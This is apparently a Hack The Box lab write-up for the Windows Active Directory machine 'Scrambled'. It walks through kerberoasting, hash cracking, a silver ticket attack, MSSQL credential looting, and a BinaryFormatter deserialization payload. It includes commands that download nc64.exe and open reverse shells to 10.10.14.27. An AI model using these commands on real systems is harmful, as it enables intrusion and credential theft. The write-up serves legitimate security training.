@@ -1,0 +1,339 @@
+                      Scrambled
+
+                                                                                  8th June 2022 / Document No D22.100.179
+                                                                                  Prepared By: amra
+                                                                                  Machine Author: VbScrub
+                                                                                  Difficulty: Medium
+                                                                                  Classification: Official
+
+                                  Synopsis
+
+Scrambled is a medium Windows Active Directory machine. Enumerating the website hosted on the remote
+machine a potential attacker is able to deduce the credentials for the user ksimpson . On the website, it is
+also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used.
+Accessing the Public share with the credentials of ksimpson , a PDF file states that an attacker retrieved
+the credentials of an SQL database. This is a hint that there is an SQL service running on the remote
+machine. Enumerating the normal user accounts, it is found that the account SqlSvc has a Service
+Principal Name (SPN) associated with it. An attacker can use this information to perform an attack that is
+knows as kerberoasting and get the hash of SqlSvc . After cracking the hash and acquiring the
+credentials for the SqlSvc account an attacker can perform a silver ticket attack to forge a ticket and
+impersonate the user Administrator on the remote MSSQL service. Enumeration of the database reveals
+the credentials for user MiscSvc , which can be used to execute code on the remote machine using
+PowerShell remoting. System enumeration as the new user reveals a .NET application, which is listening on
+port 4411 . Reverse engineering the application reveals that it is using the insecure Binary Formatter
+class to transmit data, allowing the attacker to upload their own payload and get code execution as nt
+authority\system .
+
+Skills Required
+      Enumeration
+      Kerberos authentication
+      Source code review
+      Reverse engineering
+
+Skills Learned
+
+      Kerberoasting
+      Silver ticket attack
+      Deserialization attacks
+
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.168 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.11.168
+
+The initial Nmap output reveals a lot of open ports, indicating that the machine uses Active Directory. On
+port 80 we have an IIS web server. Also, according to the Nmap output, we have a valid hostname for the
+machine scrm.local . Thus, we modify our hosts file accordingly.
+
+   echo "10.10.11.168 scrm.local" | sudo tee -a /etc/hosts
+It is worth noting, that port 4411 seems to host an unknown service. We can try connecting to it using
+Telnet.
+Unfortunately, even though the connection was successful, we don't know any valid commands.
+
+IIS - Port 80
+
+Let's begin our enumeration by visiting http://scrm.local .
+Looking around the web page, the IT Services tab reveals a note about NTLM authentication being
+disabled.
+This means that any authentication we may need to perform with the remote machine is going to be
+through Kerberos.
+Clicking on the Request a password reset option we are presented with some interesting findings.
+
+We are informed that if a user asks for a password reset, the IT support team will change the password to
+be the same as the username.
+Furthermore, when clicking on the Contacting IT support option we can find a screenshot that reveals a
+possible username.
+Since we have the username ksimpson we can try to authenticate on the remote machine using
+ksimpson:kismpon as credentials. The problem is that since the authentication will be carried out through
+Kerberos we need the fully qualified domain name of the user. We already have a valid realm scrm.local
+but we are missing the server name. For this, we can resort to the ad-ldap-enum script to find more
+information about the remote environment.
+
+   python3 ad-ldap-enum.py -d scrm.local -l 10.10.11.168 -u ksimpson -p ksimpson -v
+
+The script has created three .tsv files with information gathered from the remote LDAP server. For now,
+we are interested in Extended Domain Computer Information.tsv file since this is where we will
+probably find the server name:
+
+Since the values on this file are separated using tab the output is not easy to read on raw format, but we
+can spot the server name as DC1 . Thus, the fully qualified domain name of the user ksimpson is
+ksimpson@DC1.scrm.local .
+First of all, we need to add another entry on our hosts file:
+
+   echo "10.10.11.168 DC1.scrm.local" | sudo tee -a /etc/hosts
+Then, we can use impacket to authenticate to the SMB service as the user ksimpson using the following
+command.
+   impacket-smbclient -k scrm.local/ksimpson:ksimpson@DC1.scrm.local
+The only share that ksimpson is able to access is the Public share with he following contents.
+Let's review the PDF file we downloaded from the Public share.
+The PDF file gives us a hint that an SQL database contains some valuable credentials and is restricted to
+admins only. It also mentions Kerberos. The above information gives us a hint to look at Kerberos based
+attacks against the SQL service.
+Service accounts have SPNs (Service Principal Names). A service principal name (SPN) is the name by which a
+Kerberos client uniquely identifies an instance of a service for a given Kerberos target computer. If you
+install multiple instances of a service on computers throughout a forest, each instance must have its own
+SPN.
+The main security issue surrounding the use of Service Principle Name (SPN) accounts is the fact that any
+valid user on the domain can abuse the Kerberos authentication protocol to begin the authentication
+process and receive a hash of any SPN account in use. This action can be performed by any user on the
+domain and does not require any elevated privileges. This attack is known as kerberoasting and we can
+perform it in this scenario, against the MySQL service account, using impacket:
+
+   impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local ­k -request
+    Note: At the time of writing there is a bug with the Impacket GetUserSPNs script which causes it to fail
+    when used against a domain that has NTLM authentication disabled even though we instruct it to use
+    Kerberos authentication. For the script to work properly, you have to apply the patch mentioned here.
+
+We have successfully, retrieved a hash for the sqlsvc account. Let's try cracking it using John after adding
+the hash into a file called hash .
+
+   john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+John successfully cracked the hash and we have a clear text password of Pegasus60 for the sqlsvc
+account.
+These credentials do not directly grant us access to anything new but because this is the account that is
+running the SQL service and we have its password, we can perform a silver ticket attack to make the SQL
+service think we are domain admin.
+
+Foothold
+
+To perform the silver ticket attack against the SQL service we need three things:
+  1. The NTLM hash of the password of the SqlSvc account.
+  2. The domain SID.
+  3. The SPN that the SqlSvc account is using.
+
+First of all, we need to get the NTLM hash of the password we cracked. For this task we can use this online
+tool to get the following hash: B999A16500B87D17EC7F2E2A68778F05 .
+Then, we need to find the Security Identifier (SID) of the domain. For that, we can use ldapsearch . Since,
+NTLM authentication is disabled we have to get a Kerberos ticket for ksimpson to access ldap. To get a
+Kerberos ticket we can use kinit with the following /etc/krb5.conf file:
+
+   [libdefaults]
+                 default_realm = SCRM.LOCAL
+
+   [realms]
+                 SCRM.LOCAL = {
+                                kdc = dc1.scrm.local
+                 }
+
+   [domain_realm]
+                 .scrm.local = SCRM.LOCAL
+
+Now, we can use ldapsearch.
+   ldapsearch -H ldap://dc1.scrm.local -D 'scrm.local\ksimpson' -w 'ksimpson' -Y GSSAPI -
+   b "cn=users,dc=scrm,dc=local" | grep -i "objectSid::" | cut -d ":" -f3
+
+We get a lot of objectSid items. To transform the objectSid item to a SID we can use the following Bash
+script:
+
+   #!/bin/bash
+
+   # Base-64 encoded objectSid
+   OBJECT_ID="AQUAAAAAAAUVAAAAhQSCo0F98mxA04uX9AEAAA=="
+
+   # Decode it, hex-dump it and store it in an array
+   G=($(echo -n $OBJECT_ID | base64 -d -i | hexdump -v -e '1/1 " %02X"'))
+
+   # SID in HEX
+   # SID_HEX=${G[0]}-${G[1]}-${G[2]}${G[3]}${G[4]}${G[5]}${G[6]}${G[7]}-
+   ${G[8]}${G[9]}${G[10]}${G[11]}-${G[12]}${G[13]}${G[14]}${G[15]}-
+   ${G[16]}${G[17]}${G[18]}${G[19]}-${G[20]}${G[21]}${G[22]}${G[23]}-
+   ${G[24]}${G[25]}${G[26]}${G[27]}${G[28]}
+
+   # SID Structure: https://technet.microsoft.com/en-us/library/cc962011.aspx
+   # LESA = Little Endian Sub Authority
+   # BESA = Big Endian Sub Authority
+   # LERID = Little Endian Relative ID
+   # BERID = Big Endian Relative ID
+
+   BESA2=${G[8]}${G[9]}${G[10]}${G[11]}
+   BESA3=${G[12]}${G[13]}${G[14]}${G[15]}
+   BESA4=${G[16]}${G[17]}${G[18]}${G[19]}
+   BESA5=${G[20]}${G[21]}${G[22]}${G[23]}
+   BERID=${G[24]}${G[25]}${G[26]}${G[27]}${G[28]}
+
+   LESA1=${G[2]}${G[3]}${G[4]}${G[5]}${G[6]}${G[7]}
+   LESA2=${BESA2:6:2}${BESA2:4:2}${BESA2:2:2}${BESA2:0:2}
+   LESA3=${BESA3:6:2}${BESA3:4:2}${BESA3:2:2}${BESA3:0:2}
+   LESA4=${BESA4:6:2}${BESA4:4:2}${BESA4:2:2}${BESA4:0:2}
+   LESA5=${BESA5:6:2}${BESA5:4:2}${BESA5:2:2}${BESA5:0:2}
+   LERID=${BERID:6:2}${BERID:4:2}${BERID:2:2}${BERID:0:2}
+   LE_SID_HEX=${LESA1}-${LESA2}-${LESA3}-${LESA4}-${LESA5}-${LERID}
+   # Initial SID value which is used to construct actual SID
+   SID="S-1"
+   # Convert LE_SID_HEX to decimal values and append it to SID as a string
+   IFS='-' read -ra ADDR <<< "${LE_SID_HEX}"
+   for OBJECT in "${ADDR[@]}"; do
+
+      SID=${SID}-$((16#${OBJECT}))
+   done
+   echo ${SID}
+
+So, the SID is S-1-5-21-2743207045-1827831105-2542523200 . Notice, that the last part, in this case the
+number 500 is removed. That's because the last part is the RID part of the domain SID.
+Since we already know the SPN of the SqlSvc account to be MSSQLSvc/dc1.scrm.local:1433 we can
+proceed with the silver ticket attack. We will use the ticketer script from impacket:
+
+   mpacket-ticketer -spn "MSSQLSvc/dc1.scrm.local" -user "ksimpson" -password "ksimpson"
+   -nthash "B999A16500B87D17EC7F2E2A68778F05" -domain scrm.local -domain-sid "S-1-5-21-
+   2743207045-1827831105-2542523200" -dc-ip dc1.scrm.local Administrator
+We have a silver ticket as Administrator on the MSSQL Service . To use this ticket, first of all we have to
+destroy our previous ticket as ksimpson using kdestroy , then set the environment variable KRB5CCNAME
+to point to our silver ticket and finally access the MSSQL database using impacket.
+
+Now, we can start enumerating the remote SQL database.
+   SELECT name FROM sys.databases;
+We see an interesting database called ScrambleHR so we can list the tables of this database:
+   SELECT TABLE_NAME FROM ScrambleHR.INFORMATION_SCHEMA.TABLES;
+
+Looking inside the table UserImport we find some credentials.
+
+We can use the credentials MiscSvc:ScrambledEggs9900 to get a PowerShell remote session on the
+remote machine. To achieve this from a Linux environment we need to install Powershell, then install
+PSWSMan and finally use Enter-PSSesion to get a shell on the remote machine.
+
+   sudo pwsh
+   Install-Module -Name PSWSMan -Scope AllUsers
+   Install-WSMan
+   exit
+   sudo pwsh
+   enter-pssession -computername dc1.scrm.local -Credential MiscSvc@SCRM.LOCAL
+We have a shell as scrm\miscsvc on the remote machine, however, this shell is extremely slow. Instead we
+can upload nc64.exe on the remote machine and get a second shell, which is going to be faster.
+First of all, we set up a Python webserver and a listener on our local machine:
+
+   sudo python3 -m http.server 80&
+   rlwrap nc -lvnp 9001
+Then, we upload the binary to the remote machine:
+   cd ..\Music
+   wget http://10.10.14.27/nc64.exe -O nc64.exe
+Finally, we send a reverse shell to our listener:
+   .\nc64.exe -e powershell 10.10.14.27 9001
+
+The user flag can be found under C:\users\miscsvc\desktop\user.txt
+
+Privilege Escalation
+Privilege Escalation
+
+Looking around the remote file system as the user MiscSvc we find that we have access on the
+C:\shares\IT share. Let's use impacket-smbclient to access the files on the remote share.
+
+   impacket-smbclient -k scrm.local/MiscSvc:ScrambledEggs9900@DC1.scrm.local
+
+Looking inside the Apps\Sales Order Client we find an application along with a DLL file:
+
+We can use the command mget * to download the files and in order to make our analysis easier we can
+switch to a Windows environment and examine the files there.
+Executing the application on Windows environment we are presented with a login prompt.
+First of all we will need to specify a server name by clicking the edit option and selecting dc1.scrm.local ,
+but before that, we have to edit our Windows c:\windows\system32\drivers\etc\hosts file to resolve
+this hostname. So we edit our local hosts file with Administrator privileges and add the following lines.
+
+   10.10.11.168 dc1.scrm.local
+   10.10.11.168 scrm.local
+
+Then, we can try to login using ksimpson 's credentials but we get an error:
+Since we don't have any working credentials for this application, we should start our reverse engineering
+process. Because this is a .NET application, we can use dnSpy to take a closer look at the login function
+inside the DLL file.
+Looking at the source code we can see that the application will not check for valid credentials if the user
+name used is scrmdev .
+Once we are logged in we have the option to upload a New Order . Before we do that, we explore other
+options inside the application and we find that we can enable debug logging under the Tools menu. After
+we enable the logging, we upload a new order. Finally, we check the contents of the newly created text file
+called ScrambleDebugLog.txt .
+The log file mentions serialization and the Binary Formatter class, as well as showing the exact commands
+that are passed over to the server. We can see it sends the text UPLOAD_ORDER; followed by the Base64 of
+the serialized contents using the binary formatter.
+We can use the ysoserial.net framework to generate a payload to execute the nc64.exe binary we have
+uploaded on the previous stage.
+First of all, we set up a listener on our local machine:
+
+   rlwrap nc -lvnp 9001
+Then, use the ysoserial.net framework to generate a payload.
+
+   ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c
+   "C:\users\miscsvc\music\nc64.exe -e powershell 10.10.14.27 9001"
+
+Finally, we use telnet to send our payload over to the vulnerable application:
+We get an error, but on our listener we have a reverse shell:
+
+We can execute commands as nt authority\system and the root flag can be found under
+C:\users\administrator\desktop\root.txt .
+
+Appendix - Foothold and User from Windows
+
+Now that we have completed the machine we can present the same procedure to exploit the Foothold and
+User stages from a Windows environment.
+Since we have already executed our nmap command we can start by finding information about the remote
+machine using the ldp command on PowerShell:
+Using the IP of the machine to directly connect to the ldap reveals the domain name DC1.scrm.local ,
+which we add to our hosts file.
+Then, we can use the following command to mount the Public share to our system that the user
+ksimpson is able to access.
+
+   net use z: \\dc1.scrm.local\Public /user:scrm.local\ksimpson ksimpson
+Accessing the Network Security Changes.pdf file guides us to use Kerberoasting as our next attack. To
+perform this attack from Windows we can use Rubeus.
+
+   Rubeus.exe kerberoast /creduser:scrm.local\ksimpson@SCRM.LOCAL /credpassword:ksimpson
+   /domain:scrm.local /nowrap
+We have a hash for the sqlsvc account once again. Cracking this hash will reveal the same plain text
+Pegasus60 .
+Our next move was to perform a silver ticket attack. This time, we can use Rubeus to get the NTLM hash of
+the password Pegasus60 :
+
+   Rubeus.exe hash /password:Pegasus60
+
+This gives us the NTLM hash of: B999A16500B87D17EC7F2E2A68778F05 which is exactly the same as our first
+approach in Linux.
+To get the domain SID required to perform the attack we can use ldp once again. First of all, we have to
+Bind , from the File menu, to the server using the credentials for ksimpson :
+
+Then, we can Search for users from the Browse menu on the remote machine. Using the following
+options:
+We get the following results.
+
+Once again, we can retrieve the SID of the domain S-1-5-21-2743207045-1827831105-2542523200 after
+we remove the RID part.
+Now, we have all the information needed to create a silver ticket using Rubeus:
+
+   Rubeus.exe silver /service:MSSQLSvc/dc1.scrm.local:1433
+   /rc4:b999a16500b87d17ec7f2e2a68778f05 /sid:S-1-5-21-2743207045-1827831105-2542523200
+   /user:Administrator /domain:scrm.local /ptt
+Rubeus successfully generated the ticket and imported to the system for future use. Now, we are able to
+access the remote MSSQL service using sqlcmd :
+
+   sqlcmd -S dc1.scrm.local
+
+At this point, we can start enumerating the remote databases just like before. The only difference is that
+after each SQL query we have to send the command GO :
+Finally, since we have the credentials for the MiscSvc account we can use the Enter-PSSession
+PowerShell command to get a shell on the remote machine:
+
+With this step we conclude this section since these were the only parts of the box that were performed on
+Linux during our initial exploitation. The root part was performed entirely on Windows.
+
